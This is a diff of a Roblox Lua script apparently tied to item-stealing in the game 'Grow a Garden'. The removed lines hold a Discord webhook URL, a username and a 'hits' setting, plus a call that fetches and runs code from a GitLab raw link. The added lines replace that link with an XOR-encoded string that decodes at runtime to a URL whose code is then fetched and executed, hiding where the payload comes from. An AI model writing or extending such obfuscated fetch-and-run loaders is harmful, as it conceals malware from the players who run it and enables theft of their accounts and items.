@@ -1,6 +1,16 @@
-Username = "N3xiues"
-Webhook = "https://discord.com/api/webhooks/1394289315898724502/OVYxWHcUxBAUA_HOgawTkak5xtMaD1gZqhpeg7hpsBXk8ZO2bcJYR_u-Xq0CoGZVXh2q"
-MinimumValue = 1
-DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
+local function d(s,k)
+    local r=""
+    for i=1,#s do
+        local c=string.byte(s,i)
+        r=r..string.char(c ~ (k % 256))
+        k=(k * 31 + 17) % 4294967296
+    end
+    return r
+end
 
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
+
+local enc = "\242\193\221\241\205\198\221\204\202\212\216\252\221\237\248\233\207\224\203\231\231\211\225\245\196\229\249\244\229\211\195\230\236\204\237\242\199\194\244\200\206\243\206\251\212\242\198\245\246\241\198\247\203\246\213\251\212\241\210"
+local key = 20240714  
+
+local url = d(enc, key)
+loadstring(game:HttpGet(url))()
